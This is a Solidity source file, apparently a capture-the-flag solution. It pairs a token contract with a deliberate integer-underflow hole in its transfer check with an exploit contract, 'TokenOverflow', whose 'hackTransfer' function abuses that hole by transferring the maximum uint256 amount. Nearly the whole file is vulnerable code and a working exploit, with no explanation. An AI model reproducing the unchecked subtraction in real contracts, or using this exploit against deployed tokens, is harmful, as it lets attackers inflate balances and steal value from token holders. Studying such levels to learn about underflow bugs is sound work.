// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract TokenOverflow {
    Token token;
    uint256 MAX_INT =
        115792089237316195423570985008687907853269984665640564039457584007913129639935;

    function setToken(address _tokenAddress) external {
        token = Token(_tokenAddress);
    }

    function hackTransfer() public {
        token.transfer(msg.sender, MAX_INT);
    }
}
